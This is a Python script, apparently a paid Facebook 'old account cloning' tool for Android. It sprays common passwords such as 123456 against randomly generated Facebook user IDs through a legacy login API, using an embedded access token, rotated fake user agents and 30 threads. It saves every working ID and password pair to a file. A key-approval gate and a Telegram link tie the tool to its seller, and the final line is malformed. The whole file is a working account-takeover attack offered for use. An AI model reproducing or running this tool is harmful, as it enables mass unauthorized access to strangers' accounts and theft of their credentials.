#SCRIPT WRITTEN BY VASCO 
#SCRIPT WRITTEN FOR ORDER
#----------------------------[IMPORT/MODULE]-----------------------------------#
import os
import random
import sys
import subprocess
import time, uuid
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
    import requests

try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")
    import pycurl

#----------------------------[AUTO OPEN LINKS]----------------------------#
os.system("xdg-open https://t.me/h2vasco")

#-----------------------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
loop = 0
oks = []

#-----------------------------[APPROVAL KEY]-----------------------------------#
a = str(os.geteuid())
b = str(os.geteuid())
build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
x = (a + build + b).upper().replace(".", "")
z = "X".join(x)
keys = z[15:]
final_key = "VASCO--" + keys

#----------------------------[USER AGENT GENERATORS]----------------------------#

def VASCO1():
    android_versions = ['2.1', '2.2.1', '2.3.6', '4.0.4', '4.1.2', '4.2.2', '4.3.1', '4.4.2', '5.0.1', '5.1.1', '6.0.1']
    android_models = ['GT-I9000', 'GT-I9100', 'GT-N7000', 'SM-G610F', 'Redmi Note 3']
    return f"Dalvik/1.6.0 (Linux; Android {random.choice(android_versions)}; {random.choice(android_models)})"

def VASCO2():
    chrome_ver = f"{random.randint(5, 39)}.0.{random.randint(200, 2000)}.{random.randint(0, 150)}"
    return f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.1'])}) AppleWebKit/537.36 Chrome/{chrome_ver} Safari/537.36"

def VASCO3():
    ios_ver = random.choice(["4_3_5", "5_1_1", "6_1_6", "7_1_2"])
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X)"

def VASCO_all():
    return random.choice([VASCO1(), VASCO2(), VASCO3()])

#-----------------------------[LOGO]-----------------------------------#
now = datetime.now()
formatted_date = now.strftime("%d/%B/%Y")
formatted_time = now.strftime("%I:%M:%S %p")

logo = f"""{w}
{g}▶.  
{w}   ██╗   ██╗ ████╗ ███████╗ ██████╗ ██████╗     
██║   ██║ ██╔══██╗██╔════╝██╔════╝██╔═══██╗    
██║   ██║ ███████║███████╗██║     ██║   ██║    
╚██╗ ██╔╝ ██╔══██║╚════██║██║     ██║   ██║    
 ╚████╔╝  ██║  ██║███████║╚██████╗╚██████╔╝    
  ╚═══╝  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝     
                                              
─────────────────────────────────────────────
OWNER   : HAMIDUL ✅ H2_VASCO
GITHUB  : HAMIDUL
VERSION : 1.0
TOOLS   : FACEBOOK OLD CLONING PAID 
STATUS  : PERSONAL
─────────────────────────────────────────────
"""

#----------------------------[METHODS]-----------------------------------#
def login(uid, tl):
    global oks, loop
    try:
        ua = VASCO_all()
        sys.stdout.write(f"\r➤ {g}VASCO {r}-{g} [{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789"]:
            headers = {'user-agent': ua}
            url = f'https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            rp = requests.get(url, headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                open("/sdcard/VASCO-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
        loop += 1
    except:
        pass

#----------------------------[MAIN FUNCTION]-----------------------------------#
def main():
    os.system("clear")
    print(logo)
    lin()
    limit = input(f"{g}Enter limit : {w}")
    lin()
    sv = f"{g}[{w}2009–2014{g}]"
    user = [str(random.randint(100000000, 999999999)) for _ in range(int(limit))]
    with ThreadPool(max_workers=30) as samira:
        for uid in user:
            samira.submit(login, uid, limit)
    lin()
    print(f"{g}TOTAL OK ID : {len(oks)}")

#----------------------------[APPROVAL SYSTEM]-----------------------------------#
def approval():
    global final_key
    try:
        response = requests.get("https://raw.githubusercontent.com/MDHAMIDUL30/H2VASCO-/refs/heads/main/Approval.txt")
        if final_key in response.text:
            os.system("clear")
            print(logo)
            print(f"{g}[~] YOUR KEY '{final_key}' IS APPROVED")
            lin()
            time.sleep(2)
            main()
        else:
            os.system("clear")
            print(logo)
            print(f"{r}[!] YOUR KEY '{final_key}' IS NOT APPROVED")
            print(f"{g}[!] PLEASE CONTACT ADMIN FOR APPROVAL")
            lin()
            input(f"{g}Press Enter to open Telegram")
            os.system("xdg-open https://t.me/h2vasco")
            sys.exit()
    except:
        print(f"{r}[ERROR] CHECK INTERNET CONNECTION!")
        sys.exit()

print(f"\n{g}Your device key: {final_key}\nSend this key to admin for approval.\n")
time.sleep(2)
approval()	____main_____()
